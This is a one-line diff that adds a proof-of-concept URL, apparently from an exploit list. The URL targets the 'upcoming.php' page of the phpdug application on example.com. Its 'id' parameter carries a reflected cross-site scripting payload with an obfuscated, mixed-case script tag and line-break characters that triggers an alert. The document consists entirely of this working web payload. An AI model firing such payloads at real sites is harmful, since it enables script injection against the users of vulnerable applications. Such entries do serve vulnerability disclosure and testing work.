@@ -1,0 +1,1 @@
+http://www.example.com/phpdug/upcoming.php?id=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
